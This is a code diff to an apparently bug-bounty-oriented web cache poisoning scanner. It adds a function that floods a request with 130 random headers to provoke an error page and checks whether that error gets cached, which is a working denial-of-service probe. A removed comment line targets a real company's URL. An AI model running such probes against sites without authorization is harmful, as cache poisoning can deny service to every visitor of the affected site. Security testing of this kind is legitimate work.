@@ -398,6 +398,49 @@ def attack_port_override(url, initial_response=None, timeout=20.0):
     return (is_vulnerable, exploitable_headers)
 
 #
+# Sends over 100 headers to cause an error page. DoS
+#
+def attack_large_header_count(url, initial_response=None, timeout=20.0):
+    exploitable_headers = []
+    is_vulnerable = False
+    
+    #if the page does not return a 200 ok there's nothing to do
+    if initial_response == None:
+        cache_buster = "cache" + gen_rand_str(8)
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                                              "accept":"*/*, text/" + cache_buster,
+                                                                                                              "origin":"https://" + cache_buster + ".example.com",})
+    else:
+        response = initial_response
+
+    if response.status_code != 200:
+        return (is_vulnerable, exploitable_headers)
+
+    cache_buster = "cache" + gen_rand_str(8)
+
+    headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+             "accept":"*/*, text/" + cache_buster,
+             "origin":"https://" + cache_buster + ".example.com"}
+
+    for _ in range(130):
+        headers["x-random-" + gen_rand_str(6)] = "value-" + gen_rand_str(6)
+
+    response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers=headers)
+        #if we get a non 200 response code, we remove the header and resend the request
+    if response.status_code != 200 and response.status_code != 429:
+        poisoned_response_status = response.status_code
+
+        time.sleep(0.5)
+        response = httpx.request("GET", url, timeout=timeout, params={"cache-buster": cache_buster}, headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
+                                                                                        "accept":"*/*, text/" + cache_buster,
+                                                                                        "origin":"https://" + cache_buster + ".example.com"})
+        if response.status_code == poisoned_response_status:
+            exploitable_headers.append("x-random-header")
+            is_vulnerable = True
+    
+    return (is_vulnerable, exploitable_headers)
+
+#
 # Overrides the request method to HEAD in order to get an empty response cached, DoS.
 #
 def attack_method_override(url, initial_response=None, timeout=20.0):
@@ -1075,10 +1118,3 @@ def assess_severity(url, program_name, headers, thread_count = 5):
                 logging.warning(termcolor.colored(msg, msg_color))
 
     return header_assessments
-
-#logging.basicConfig(level=logging.INFO, format='%(message)s')
-#print_banner()
-
-#test
-#a = attack_evil_user_agent("https://experience.dropbox.com")
-#print(a)
